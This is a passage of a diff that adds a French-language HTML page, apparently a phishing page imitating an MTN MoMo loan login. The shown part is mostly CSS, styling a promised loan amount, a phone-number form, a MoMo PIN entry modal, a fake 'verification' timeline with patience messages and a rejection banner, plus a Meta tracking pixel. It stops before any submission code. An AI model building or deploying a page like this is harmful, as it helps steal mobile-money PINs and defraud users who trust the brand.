@@ -1,0 +1,1998 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
+  <title>MoMo Xtra Prêts – Connexion</title>
+
+  <!-- META PIXEL -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1021851290903869');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
+  /></noscript>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --black: #000000;
+      --mtn-dark: #003366;
+      --mtn-mid: #004080;
+      --mtn-gold: #FFCC00;
+      --mtn-gold-light: #FFD633;
+      --mtn-gold-dark: #E6B800;
+      --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
+      --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+      --page-bg: #f9fafb;
+      --white: #FFFFFF;
+      --text-dark: #1C2340;
+      --text-mid: #4B5168;
+      --text-light: #8B90A3;
+      --border: #E4E7EF;
+      --error: #DC2626;
+      --orange-500: #F97316;
+      --orange-600: #EA580C;
+      --green-600: #16A34A;
+      --radius-lg: 22px;
+      --radius-md: 16px;
+      --radius-xl: 26px;
+      --shadow-md: 0 6px 20px rgba(0, 25, 60, 0.08);
+      --shadow-lg: 0 20px 50px rgba(0, 25, 60, 0.12);
+      --shadow-2xl: 0 20px 40px rgba(0, 0, 0, 0.2);
+      --header-h: 74px;
+      --footer-h: 68px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    html, body { width: 100%; overflow-x: hidden; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--page-bg);
+      color: var(--text-dark);
+      min-height: 100vh;
+      padding-top: var(--header-h);
+      padding-bottom: var(--footer-h);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    body.modal-open { overflow: hidden; }
+
+    /* HEADER */
+    .header {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: var(--header-h);
+      background-color: var(--black);
+      color: var(--white);
+      z-index: 100;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+    }
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      height: 100%;
+      padding: 0 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: inherit;
+      flex-shrink: 0;
+      min-width: 0;
+    }
+    .brand-logo-img {
+      height: 44px;
+      width: auto;
+      display: block;
+      border-radius: 8px;
+      filter: drop-shadow(0 2px 8px rgba(255, 204, 0, 0.25));
+    }
+    .brand-divider {
+      width: 1px; height: 26px;
+      background: rgba(255, 255, 255, 0.2);
+      margin: 0 4px;
+      flex-shrink: 0;
+    }
+    .brand-sub {
+      font-size: 12px;
+      color: var(--mtn-gold);
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+      text-transform: uppercase;
+    }
+
+    /* LANGUAGE */
+    .lang-wrap { position: relative; flex-shrink: 0; }
+    .lang-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.78rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      padding: 7px 12px;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    .lang-btn:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
+    .lang-btn .globe { font-size: 0.85rem; opacity: 0.85; }
+    .lang-btn .caret { font-size: 0.55rem; opacity: 0.7; transition: transform 0.25s; }
+    .lang-wrap.open .lang-btn .caret { transform: rotate(180deg); }
+
+    .lang-menu {
+      position: absolute;
+      top: calc(100% + 8px);
+      right: 0;
+      min-width: 180px;
+      background: #fff;
+      border: 1.5px solid #E4E7EF;
+      border-radius: 14px;
+      box-shadow: 0 16px 40px rgba(0, 51, 102, 0.22);
+      overflow: hidden;
+      max-height: 0;
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(-6px);
+      transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
+      z-index: 500;
+    }
+    .lang-wrap.open .lang-menu {
+      max-height: 320px; opacity: 1; visibility: visible; transform: translateY(0);
+    }
+    .lang-item {
+      display: flex; align-items: center; width: 100%;
+      padding: 12px 16px; background: #fff; border: none;
+      border-top: 1px solid #F0F3F9; cursor: pointer;
+      font-family: 'Inter', sans-serif; font-size: 14px;
+      font-weight: 600; color: var(--text-dark); text-align: left;
+      transition: background 0.15s;
+    }
+    .lang-item:first-child { border-top: none; }
+    .lang-item:hover { background: #F0F4FF; }
+    .lang-item.selected { background: #F0F4FF; }
+    .lang-item .check {
+      margin-left: auto; color: var(--mtn-dark); font-weight: 900;
+      opacity: 0; transform: scale(0.6); transition: all 0.18s;
+    }
+    .lang-item.selected .check { opacity: 1; transform: scale(1); }
+
+    .main {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 22px 16px 36px;
+    }
+    .login-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: calc(100vh - var(--header-h) - var(--footer-h) - 40px);
+      padding: 8px 0;
+    }
+    .login-card-wrap { width: 100%; max-width: 440px; }
+
+    /* Red banner */
+    .reject-banner {
+      position: fixed;
+      top: calc(var(--header-h) + 12px);
+      left: 50%;
+      transform: translateX(-50%) translateY(-120%);
+      width: calc(100% - 32px);
+      max-width: 440px;
+      background: linear-gradient(135deg, #FEF2F2, #FEE2E2);
+      border: 1px solid #FECACA;
+      border-left: 4px solid #DC2626;
+      border-radius: 14px;
+      padding: 14px 16px;
+      box-shadow: 0 12px 32px rgba(220, 38, 38, 0.22);
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      z-index: 5000;
+      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.4s ease;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .reject-banner.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+    .reject-banner .r-ico { font-size: 18px; flex-shrink: 0; line-height: 1.3; }
+    .reject-banner .r-text {
+      font-size: 12.5px;
+      font-weight: 700;
+      color: #7F1D1D;
+      line-height: 1.5;
+    }
+    .reject-banner .r-text b { color: #991B1B; font-weight: 900; }
+
+    /* MOMO BAND */
+    .momo-band {
+      background: var(--grad-gold);
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+      padding: 22px 24px 26px;
+      text-align: center;
+      box-shadow: var(--shadow-md);
+      position: relative;
+      overflow: hidden;
+    }
+    .momo-band::before {
+      content: "";
+      position: absolute;
+      top: -50px; right: -50px;
+      width: 160px; height: 160px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.5), transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .momo-band::after {
+      content: "";
+      position: absolute;
+      bottom: -60px; left: -30px;
+      width: 140px; height: 140px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.35), transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .momo-logo-wrap {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.6);
+      backdrop-filter: blur(8px);
+      border-radius: 16px;
+      padding: 10px 18px;
+      margin-bottom: 14px;
+      box-shadow: 0 4px 14px rgba(122, 90, 0, 0.15);
+      position: relative;
+      z-index: 1;
+    }
+    .momo-logo-img {
+      height: 42px;
+      width: auto;
+      display: block;
+      border-radius: 6px;
+    }
+
+    /* AMOUNT BADGE */
+    .amount-badge {
+      display: inline-flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+      background: #ffffff;
+      border: 2px solid rgba(255, 255, 255, 0.9);
+      border-radius: 16px;
+      padding: 12px 24px;
+      box-shadow: 0 8px 24px rgba(122, 90, 0, 0.22);
+      position: relative;
+      z-index: 1;
+      animation: amountPop 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+    }
+    @keyframes amountPop {
+      from { opacity: 0; transform: scale(0.9) translateY(8px); }
+      to   { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .amount-badge .amount-label {
+      font-size: 9.5px;
+      font-weight: 800;
+      color: #7A5A00;
+      letter-spacing: 0.10em;
+      text-transform: uppercase;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .amount-badge .amount-value {
+      font-size: 1.6rem;
+      font-weight: 900;
+      color: var(--mtn-dark);
+      letter-spacing: -0.02em;
+      line-height: 1.15;
+      font-variant-numeric: tabular-nums;
+    }
+    .amount-badge .amount-currency {
+      font-size: 0.85rem;
+      font-weight: 800;
+      color: #7A5A00;
+      margin-right: 3px;
+    }
+    .amount-badge .amount-sub {
+      font-size: 10px;
+      font-weight: 700;
+      color: #4b5168;
+      letter-spacing: 0.02em;
+      margin-top: 2px;
+    }
+
+    /* BODY CARD */
+    .login-body {
+      background: var(--white);
+      border-radius: 0 0 var(--radius-lg) var(--radius-lg);
+      padding: 26px 22px 28px;
+      box-shadow: var(--shadow-lg);
+    }
+    .welcome-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      letter-spacing: -0.02em;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .welcome-sub {
+      font-size: 0.82rem;
+      color: var(--text-light);
+      font-weight: 500;
+      text-align: center;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    /* FORM */
+    .form-field { margin-bottom: 18px; position: relative; }
+    .input-label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
+      background: #FBFCFE;
+      position: relative;
+    }
+    .phone-input:focus-within {
+      border-color: var(--mtn-gold);
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
+    }
+    .phone-input.invalid {
+      border-color: var(--error);
+      background: #FFF5F5;
+      box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.10);
+      animation: shake 0.4s ease;
+    }
+    .country-btn {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 14px 14px;
+      background: #F7F8FB;
+      font-weight: 800;
+      font-size: 14px;
+      color: var(--text-dark);
+      border: none;
+      border-right: 1.5px solid var(--border);
+      white-space: nowrap;
+      flex-shrink: 0;
+      font-family: 'Inter', sans-serif;
+    }
+    .flag-svg {
+      width: 22px;
+      height: 15px;
+      border-radius: 3px;
+      box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
+      flex-shrink: 0;
+    }
+    .phone-input input {
+      border: none !important;
+      box-shadow: none !important;
+      flex: 1;
+      border-radius: 0;
+      padding: 14px 14px;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      color: var(--text-dark);
+      font-weight: 700;
+      outline: none;
+      min-width: 0;
+      background: transparent;
+      letter-spacing: 0.5px;
+    }
+    .phone-input input::placeholder {
+      color: #A8AFC0;
+      font-weight: 500;
+      letter-spacing: normal;
+    }
+    .error-text {
+      color: var(--error);
+      font-size: 12px;
+      margin-top: 8px;
+      display: none;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .error-text.show { display: block; animation: slideDown 0.3s ease; }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-4px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    /* LOGIN BUTTON */
+    .login-btn {
+      width: 100%;
+      padding: 17px;
+      background: var(--grad-gold);
+      color: #1A1A2E;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s, filter 0.2s;
+      font-family: 'Inter', sans-serif;
+      margin-top: 22px;
+      box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .login-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+      transform: translateX(-100%);
+      transition: transform 0.7s;
+    }
+    .login-btn:hover::after { transform: translateX(100%); }
+    .login-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+      filter: brightness(0.98);
+    }
+    .login-btn:active:not(:disabled) { transform: scale(0.98); }
+    .login-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    .btn-spinner-dark {
+      display: inline-block;
+      width: 16px; height: 16px;
+      border: 2.5px solid rgba(0, 0, 0, 0.2);
+      border-top-color: #1A1A2E;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      margin-right: 4px;
+    }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 16px;
+      font-size: 11.5px;
+      color: var(--text-light);
+      font-weight: 600;
+      text-align: center;
+    }
+    .security-note .ico { font-size: 13px; color: var(--green-600); }
+
+    .signup-text {
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-light);
+      margin-top: 16px;
+      font-weight: 500;
+    }
+    .signup-text a {
+      color: var(--mtn-dark);
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .signup-text a:hover { text-decoration: underline; }
+
+    /* BOTTOM NAV */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: var(--footer-h);
+      background: var(--white);
+      border-top: 1px solid var(--border);
+      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.06);
+      z-index: 100;
+    }
+    .bottom-nav-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      height: 100%;
+      padding: 0 12px;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+    }
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      color: #8a90a2;
+      font-size: 11px;
+      font-weight: 700;
+      text-decoration: none;
+      padding: 6px 14px;
+      border-radius: 12px;
+      transition: color 0.2s, transform 0.2s;
+    }
+    .nav-item .ico { font-size: 20px; }
+    .nav-item:hover { transform: translateY(-2px); }
+    .nav-item.active { color: var(--mtn-dark); }
+
+    /* PIN POPUP */
+    .modal-container { position: fixed; inset: 0; z-index: 9999; display: none; }
+    .modal-container.open { display: block; }
+    .sheet-overlay {
+      position: absolute; inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(3px);
+      animation: fadeIn 0.2s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .pin-modal {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      bottom: 170px;
+      background: var(--white);
+      width: calc(100% - 32px);
+      max-width: 400px;
+      border-radius: var(--radius-xl);
+      padding: 24px 22px;
+      box-shadow: var(--shadow-2xl);
+      opacity: 0;
+      transition: opacity 0.25s ease, transform 0.25s ease, bottom 0.25s ease;
+      z-index: 1;
+    }
+    .pin-modal.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .pin-modal-title {
+      font-size: 18px;
+      color: var(--black);
+      margin-bottom: 14px;
+      line-height: 1.45;
+      font-weight: 700;
+    }
+    .pin-modal-title strong { font-weight: 900; color: var(--orange-600); }
+    .pin-modal-sub {
+      font-size: 13.5px;
+      color: var(--text-mid);
+      margin-bottom: 20px;
+      line-height: 1.55;
+    }
+    .pin-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+    }
+    .pin-input-wrap { position: relative; display: flex; align-items: center; }
+    .pin-input {
+      width: 100%;
+      padding: 14px 52px 14px 16px;
+      background: var(--white);
+      color: var(--black);
+      font-size: 24px;
+      outline: none;
+      border: 2px solid var(--border);
+      border-radius: var(--radius-md);
+      letter-spacing: 12px;
+      text-align: center;
+      font-weight: 800;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+    }
+    .pin-input::placeholder {
+      color: #C8CFDF;
+      letter-spacing: 8px;
+      font-weight: 500;
+    }
+    .pin-input:focus {
+      border-color: var(--orange-500);
+      box-shadow: 0 0 0 4px rgba(249, 115, 22, 0.15);
+    }
+    .pin-eye-btn {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-light);
+      font-size: 20px;
+      transition: color 0.2s, background 0.2s;
+      cursor: pointer;
+      border: none;
+      background: none;
+    }
+    .pin-eye-btn:hover { color: var(--text-dark); background: #F2F4F9; }
+    .pin-eye-btn.active { color: var(--orange-500); }
+    .pin-eye-btn svg {
+      width: 22px; height: 22px;
+      stroke: currentColor;
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    .pin-forgot-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 10px;
+      margin-bottom: 6px;
+    }
+    .pin-forgot {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--mtn-dark);
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .pin-forgot:hover { text-decoration: underline; }
+    .pin-error {
+      color: var(--error);
+      font-size: 12px;
+      margin-top: 10px;
+      display: none;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .pin-error.show { display: block; animation: slideDown 0.3s ease; }
+    .pin-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 22px;
+    }
+    .btn-cancel {
+      padding: 14px;
+      font-weight: 800;
+      font-size: 14px;
+      color: var(--black);
+      background: var(--white);
+      border: 2px solid var(--border);
+      border-radius: var(--radius-md);
+      transition: background 0.2s;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+    }
+    .btn-cancel:hover { background: #F2F4F9; }
+    .btn-pin-proceed {
+      padding: 14px;
+      font-weight: 900;
+      font-size: 14px;
+      color: var(--black);
+      background: var(--grad-gold);
+      border: none;
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      transition: filter 0.2s, transform 0.15s, opacity 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 12px rgba(255, 204, 0, 0.35);
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+    }
+    .btn-pin-proceed:hover:not(:disabled) {
+      filter: brightness(0.96);
+      box-shadow: 0 6px 16px rgba(255, 204, 0, 0.5);
+    }
+    .btn-pin-proceed:active:not(:disabled) { transform: scale(0.97); }
+    .btn-pin-proceed:disabled { opacity: 0.35; cursor: not-allowed; box-shadow: none; }
+    .btn-spinner {
+      width: 16px; height: 16px;
+      border: 2.5px solid rgba(0, 0, 0, 0.25);
+      border-top-color: var(--black);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ============================================================
+       VERIFY OVERLAY — Timeline + Amount
+       ============================================================ */
+    .verify-overlay {
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(900px 600px at 50% -10%, rgba(255, 204, 0, 0.10), transparent 60%),
+        radial-gradient(700px 500px at 50% 110%, rgba(0, 64, 128, 0.35), transparent 60%),
+        linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      z-index: 10000;
+      overflow-y: auto;
+    }
+    .verify-overlay.show { display: flex; animation: vFadeIn 0.45s ease; }
+    @keyframes vFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .verify-overlay::before {
+      content: '';
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 520px; height: 520px;
+      transform: translate(-50%, -50%);
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.18), transparent 65%);
+      filter: blur(30px);
+      animation: vGlow 3.6s ease-in-out infinite;
+      pointer-events: none;
+    }
+    @keyframes vGlow {
+      0%, 100% { opacity: 0.55; transform: translate(-50%, -50%) scale(1); }
+      50%      { opacity: 0.9;  transform: translate(-50%, -50%) scale(1.08); }
+    }
+
+    .verify-card {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 26px;
+      padding: 22px 20px 20px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      border: 1px solid rgba(255, 204, 0, 0.18);
+      box-shadow:
+        0 30px 60px rgba(0, 0, 0, 0.45),
+        inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      text-align: center;
+      animation: vCardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+      margin: auto 0;
+    }
+    @keyframes vCardIn {
+      from { opacity: 0; transform: translateY(18px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .verify-ring-wrap {
+      position: relative;
+      width: 88px; height: 88px;
+      margin: 0 auto 14px;
+    }
+    .verify-ring-wrap svg {
+      width: 100%; height: 100%;
+      transform: rotate(-90deg);
+      display: block;
+    }
+    .verify-ring-wrap .track {
+      fill: none;
+      stroke: rgba(255, 204, 0, 0.10);
+      stroke-width: 5;
+    }
+    .verify-ring-wrap .progress {
+      fill: none;
+      stroke: url(#vGoldGrad);
+      stroke-width: 5;
+      stroke-linecap: round;
+      stroke-dasharray: 226.20;
+      stroke-dashoffset: 226.20;
+      transition: stroke-dashoffset 0.6s ease;
+      filter: drop-shadow(0 0 6px rgba(255, 204, 0, 0.55));
+    }
+    .verify-ring-core {
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 56px; height: 56px;
+      transform: translate(-50%, -50%);
+      border-radius: 50%;
+      background: var(--grad-gold);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 6px;
+      box-shadow:
+        0 0 0 6px rgba(255, 204, 0, 0.08),
+        0 0 24px rgba(255, 204, 0, 0.45);
+      animation: vCorePulse 2.4s ease-in-out infinite;
+      overflow: hidden;
+    }
+    .verify-ring-core img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 50%;
+    }
+    @keyframes vCorePulse {
+      0%, 100% { box-shadow: 0 0 0 6px rgba(255, 204, 0, 0.08), 0 0 24px rgba(255, 204, 0, 0.40); }
+      50%      { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0.05), 0 0 36px rgba(255, 204, 0, 0.75); }
+    }
+
+    .verify-amount-block {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .verify-amount-value {
+      font-size: 1.6rem;
+      font-weight: 900;
+      background: linear-gradient(90deg, #FFD633, #FFCC00, #F5B500);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.02em;
+      line-height: 1.1;
+      font-variant-numeric: tabular-nums;
+    }
+    .verify-amount-value .cur {
+      font-size: 0.85rem;
+      font-weight: 800;
+      -webkit-text-fill-color: rgba(255, 255, 255, 0.75);
+      margin-right: 4px;
+      letter-spacing: 0.04em;
+    }
+    .verify-amount-sub {
+      font-size: 10.5px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.55);
+      letter-spacing: 0.10em;
+      text-transform: uppercase;
+      margin-top: 3px;
+    }
+
+    .verify-timeline {
+      text-align: left;
+      max-height: 220px;
+      overflow-y: auto;
+      padding: 8px 4px 8px 4px;
+      margin-bottom: 14px;
+      scrollbar-width: thin;
+    }
+    .verify-timeline::-webkit-scrollbar { width: 3px; }
+    .verify-timeline::-webkit-scrollbar-thumb { background: rgba(255, 204, 0, 0.2); border-radius: 3px; }
+
+    .tl-step {
+      display: flex;
+      gap: 10px;
+      opacity: 0;
+      transform: translateY(6px);
+      transition: opacity 0.35s ease, transform 0.35s ease;
+    }
+    .tl-step.visible { opacity: 1; transform: translateY(0); }
+
+    .tl-node-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .tl-node {
+      width: 26px; height: 26px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 900;
+      flex-shrink: 0;
+      transition: box-shadow 0.3s, transform 0.3s;
+    }
+    .tl-node.done {
+      background: linear-gradient(135deg, #FFCC00, #FFD633);
+      color: #003366;
+      box-shadow: 0 2px 10px rgba(255, 204, 0, 0.4);
+    }
+    .tl-node.active {
+      background: linear-gradient(135deg, #FFCC00, #FFD633);
+      color: #003366;
+      box-shadow: 0 2px 10px rgba(255, 204, 0, 0.4);
+      animation: tlPulse 1.8s ease-in-out infinite;
+    }
+    @keyframes tlPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.55); }
+      50%      { box-shadow: 0 0 0 8px rgba(255, 204, 0, 0); }
+    }
+    .tl-connector {
+      width: 2px;
+      flex: 1;
+      min-height: 14px;
+      background: linear-gradient(180deg, rgba(255, 204, 0, 0.7), rgba(255, 204, 0, 0.1));
+      margin: 2px 0;
+      border-radius: 2px;
+      opacity: 0;
+      transition: opacity 0.3s ease 0.15s;
+    }
+    .tl-step.visible .tl-connector { opacity: 1; }
+
+    .tl-text {
+      flex: 1;
+      padding-top: 4px;
+      padding-bottom: 14px;
+      font-size: 12.5px;
+      line-height: 1.4;
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.88);
+    }
+    .tl-text .sub {
+      display: block;
+      margin-top: 2px;
+      font-size: 10.5px;
+      color: rgba(255, 204, 0, 0.7);
+      font-weight: 500;
+    }
+    .tl-step:last-child .tl-text { padding-bottom: 0; }
+    .tl-step:last-child .tl-connector { display: none; }
+
+    .verify-progress {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 204, 0, 0.10);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    .verify-progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+      background-size: 200% 100%;
+      border-radius: 3px;
+      transition: width 0.5s ease;
+      animation: vShimmer 2s linear infinite;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.55);
+    }
+    @keyframes vShimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+
+    .verify-patience {
+      font-size: 10.5px;
+      color: rgba(255, 204, 0, 0.85);
+      font-weight: 600;
+      line-height: 1.45;
+      padding: 8px 12px;
+      border-radius: 10px;
+      background: rgba(255, 204, 0, 0.08);
+      border: 1px solid rgba(255, 204, 0, 0.20);
+      opacity: 0;
+      max-height: 0;
+      overflow: hidden;
+      transition: opacity 0.5s ease, max-height 0.5s ease, padding 0.3s ease, margin 0.3s ease;
+      margin-top: 0;
+      text-align: center;
+    }
+    .verify-patience.show {
+      opacity: 1;
+      max-height: 100px;
+      padding: 8px 12px;
+      margin-top: 10px;
+    }
+
+    .verify-live {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 12px;
+      border-radius: 50px;
+      background: rgba(34, 197, 94, 0.10);
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      font-size: 9.5px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #86EFAC;
+      margin-top: 10px;
+    }
+    .verify-live-dot {
+      width: 5px; height: 5px; border-radius: 50%;
+      background: #22C55E;
+      box-shadow: 0 0 8px rgba(34, 197, 94, 0.9);
+      animation: vLivePulse 1.6s ease-in-out infinite;
+    }
+    @keyframes vLivePulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: 0.4; transform: scale(0.7); }
+    }
+    .verify-live .elapsed-text {
+      color: rgba(134, 239, 172, 0.75);
+      margin-left: 2px;
+    }
+
+    /* Line inactive overlay */
+    .line-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      z-index: 11000;
+    }
+    .line-overlay.show { display: flex; animation: fadeIn 0.3s ease; }
+    .line-card {
+      background: #fff;
+      border-radius: 26px;
+      width: 100%;
+      max-width: 420px;
+      padding: 34px 26px 28px;
